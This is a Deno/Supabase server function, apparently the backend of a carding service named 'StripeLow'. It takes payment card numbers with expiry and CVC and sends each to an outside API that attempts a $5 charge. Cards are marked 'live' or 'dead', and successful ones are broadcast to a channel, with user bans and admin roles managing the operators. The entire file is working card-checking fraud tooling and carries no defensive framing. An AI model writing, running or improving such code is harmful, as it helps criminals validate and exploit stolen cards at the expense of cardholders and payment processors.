import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

const API_BASE_URL = "https://3-production-c130.up.railway.app/api";

// Notify charged card (fire-and-forget)
const notifyChargedCard = (
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN",
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      userId,
      cardDetails,
      status,
      responseMessage,
      amount,
      gateway,
    }),
  }).catch((err) => console.error("[STRIPELOW] notify-charged-card error:", err));
};

// Call the API
const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}`;
  
  console.log(`[STRIPELOW] Calling: ${apiUrl}`);
  
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 55000);
  
  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    console.log(`[STRIPELOW] Raw response: ${rawText}`);
    
    if (!rawText || rawText.trim() === '') {
      return { status: 'unknown', message: 'Empty response from gateway', rawResponse: '' };
    }
    
    let apiStatus = 'unknown';
    let apiMessage = 'Transaction processed';
    
    try {
      const json = JSON.parse(rawText);
      
      // Extract message - handle nested error structure from API
      // API format: {"success":false,"error":{"error":{"code":"card_declined","message":"..."}}}
      if (json.error?.error?.message) {
        apiMessage = json.error.error.message;
      } else if (json.error?.message) {
        apiMessage = json.error.message;
      } else if (json.message && typeof json.message === 'string') {
        apiMessage = json.message;
      } else if (json.msg && typeof json.msg === 'string') {
        apiMessage = json.msg;
      } else if (json.error && typeof json.error === 'string') {
        apiMessage = json.error;
      }
      
      // Determine status based on response
      const successField = json.success;
      const statusField = String(json.status || '').toLowerCase();
      const errorCode = json.error?.error?.code || json.error?.code || '';
      
      // Check success field first (most reliable)
      if (successField === false) {
        apiStatus = 'dead';
      } else if (successField === true) {
        apiStatus = 'live';
      }
      // Check error codes
      else if (errorCode === 'card_declined' || errorCode.includes('declined') || errorCode.includes('error')) {
        apiStatus = 'dead';
      }
      // Check status field
      else if (statusField === 'declined' || statusField === 'failed' || statusField === 'error') {
        apiStatus = 'dead';
      } else if (statusField === 'success' || statusField === 'charged' || statusField === 'approved') {
        apiStatus = 'live';
      }
      // Fallback: check message content
      else {
        const lowerMessage = apiMessage.toLowerCase();
        if (lowerMessage.includes('declined') || lowerMessage.includes('failed') || 
            lowerMessage.includes('invalid') || lowerMessage.includes('expired') || 
            lowerMessage.includes('insufficient') || lowerMessage.includes('card_error')) {
          apiStatus = 'dead';
        } else if (lowerMessage.includes('success') || lowerMessage.includes('charged') || 
                   lowerMessage.includes('approved')) {
          apiStatus = 'live';
        }
      }
      
    } catch {
      // Non-JSON response - parse as text
      const lowerText = rawText.toLowerCase();
      apiMessage = rawText.substring(0, 200); // Limit message length
      
      if (lowerText.includes('declined') || lowerText.includes('failed') || lowerText.includes('error')) {
        apiStatus = 'dead';
      } else if (lowerText.includes('success') || lowerText.includes('charged') || lowerText.includes('approved')) {
        apiStatus = 'live';
      }
    }
    
    return { status: apiStatus, message: apiMessage, rawResponse: rawText };
    
  } catch (error) {
    clearTimeout(timeoutId);
    const errMsg = error instanceof Error ? error.message : 'Unknown error';
    console.error(`[STRIPELOW] Error: ${errMsg}`);
    return { status: 'unknown', message: 'Request timeout or connection error', rawResponse: errMsg };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { cc } = body;
    
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Card required', computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Validate card format: CardNumber|MM|YY|CVC
    const parts = cc.split('|');
    if (parts.length < 4 || !parts[3] || parts[3].length < 3 || !/^\d+$/.test(parts[3])) {
      return new Response(JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Start API call while auth happens in parallel
    const apiPromise = callApi(cc);

    // Verify auth
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Check if banned
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }), 
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Check if user is admin (for raw response access)
    const { data: roleData } = await supabase
      .from("user_roles")
      .select("role")
      .eq("user_id", user.id)
      .eq("role", "admin")
      .single();
    
    const isAdmin = !!roleData;

    // Wait for API result
    const result = await apiPromise;
    
    // Broadcast CHARGED cards to channel (fire-and-forget)
    if (result.status === 'live') {
      notifyChargedCard(
        user.id,
        cc,
        'CHARGED',
        result.message,
        '$5',
        'StripeLow'
      );
    }
    
    // Build response - only include rawResponse for admins
    const responseData: Record<string, unknown> = {
      computedStatus: result.status,
      apiStatus: result.status === 'live' ? 'CHARGED' : result.status === 'dead' ? 'DECLINED' : 'UNKNOWN',
      apiMessage: result.message,
      apiTotal: '$5',
      chargeAmount: '$5',
      status: result.status,
      message: result.message,
    };
    
    // Only include raw response for admins
    if (isAdmin) {
      responseData.rawResponse = result.rawResponse;
    }
    
    return new Response(
      JSON.stringify(responseData),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, computedStatus: "unknown" }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
